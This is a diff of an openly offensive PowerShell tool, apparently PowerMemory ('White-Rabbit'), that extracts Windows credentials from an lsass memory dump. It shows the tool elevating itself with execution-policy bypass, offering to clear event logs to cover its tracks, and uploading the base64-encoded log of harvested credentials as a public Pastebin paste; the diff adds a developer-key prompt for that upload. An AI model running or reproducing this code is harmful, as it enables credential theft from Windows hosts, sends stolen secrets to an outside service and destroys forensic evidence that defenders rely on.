@@ -2,10 +2,10 @@
 <#
 
 .SYNOPSIS         
-    Reveal credentials from memory dump
+    Reveal credentials from Windows Memory
 
 .NOTES
-    Version:        0.3
+    Version:        0.4
     Author:         Pierre-Alexandre Braeken
     Creation Date:  2015-05-01
 
@@ -20,12 +20,13 @@ Param
         $relaunched = 0
     )
 #---------------------------------------------------------[Initialisations]--------------------------------------------------------
-Set-StrictMode -version Latest
+Set-StrictMode -version 2
 
 $scriptPath = split-path -parent $MyInvocation.MyCommand.Definition
+$scriptParentPath = split-path -parent $scriptPath
 $scriptFile = $MyInvocation.MyCommand.Definition
 $launchDate = get-date -f "yyyyMMddHHmmss"
-$logDirectoryPath = $scriptPath + "\" + $launchDate
+$logDirectoryPath = $scriptParentPath + "\" + $launchDate
 $file = "$logDirectoryPath\lsass.dmp"
 $buffer = "$scriptPath\bufferCommand.txt"
 $fullScriptPath = (Resolve-Path -Path $buffer).Path
@@ -57,7 +58,7 @@ $hostMode = ""
 #----------------------------------------------------------[Declarations]----------------------------------------------------------
 
 $scriptName = [System.IO.Path]::GetFileName($scriptFile)
-$scriptVersion = "0.2"
+$scriptVersion = "0.4"
 
 if(!(Test-Path $logDirectoryPath)) {
     New-Item $logDirectoryPath -type directory | Out-Null
@@ -84,10 +85,10 @@ $global:streamWriter = New-Object System.IO.StreamWriter $logPathName
 
 Start-Log -scriptName $scriptName -scriptVersion $scriptVersion -streamWriter $global:streamWriter
 cls
-Write-Host "================================================================================================"
+Write-Output "================================================================================================"
 White-Rabbit
 
-# Prérequis
+# Prerequis
 Test-InternetConnection
 
 if($relaunched -eq 0) {
@@ -101,9 +102,9 @@ $adminFlag = Test-LocalAdminRights
 if($adminFlag -eq $false){        
     Write-Host "You have to launch this script with " -nonewline; Write-Host "local Administrator rights!" -f Red    
     $scriptPath = Split-Path $MyInvocation.InvocationName   
-    $RWMC = $scriptPath + "\RWMC.ps1 1"     
+    $RWMC = $scriptPath + "\White-Rabbit.ps1 1"     
     $ArgumentList = 'Start-Process -FilePath powershell.exe -ArgumentList \"-ExecutionPolicy Bypass -File "{0}"\" -Verb Runas' -f $RWMC;
-    Start-Process -FilePath powershell.exe -ArgumentList $ArgumentList -Wait -NoNewWindow;    
+    Start-Process -FilePath powershell.exe -ArgumentList $ArgumentList -Wait -NoNewWindow;        
     Stop-Script
 }    
     #}
@@ -209,6 +210,9 @@ switch ($exFiltrate){
     "0" {Stop-Script}    
     default {Write-Output "The option could not be determined... Exfiltration will be not used";$exFiltrate = "0"}
 }
+if($exFiltrate -eq 1) {
+    $devKey = Read-Host 'Please, enter your developper key'
+}
 
 $clearEventLog = Read-Host 'Do you want to clear event log on this local computer ?
 1) Yes
@@ -228,7 +232,7 @@ switch ($clearEventLog){
 }
 
 if($clearEventLog -eq 1) {
-     Stop-Activities $scriptPath
+     Stop-Activities
 }
 
 if($hostMode -ne "") {
@@ -335,14 +339,14 @@ if($clearEventLog -eq 1) {
      Clear-Activities $scriptPath
 }
 
-if($exFiltrate -eq 1 -and ![string]::IsNullOrEmpty($dev_key)) {    
+if($exFiltrate -eq 1 -and !([string]::IsNullOrEmpty($devKey))) {           
     Write-Progress -Activity "Exfiltrate" -status "Running..." -id 1 
     $dataToExfiltrate = Get-Content $logPathName
     $utfEncodedBytes  = [System.Text.Encoding]::UTF8.GetBytes($dataToExfiltrate)
     $pasteValue = [System.Convert]::ToBase64String($utfEncodedBytes)
     $pasteName = "PowerMemory (Follow the White Rabbit)"    
     $url = "https://pastebin.com/api/api_post.php"
-    $parameters = "&api_option=paste&api_dev_key=$dev_key&api_paste_name=$pasteName&api_paste_code=$pasteValue&api_paste_private=0" 
+    $parameters = "&api_option=paste&api_dev_key=$devKey&api_paste_name=$pasteName&api_paste_code=$pasteValue&api_paste_private=0" 
     Post-HttpRequest $url $parameters
 }
 cls
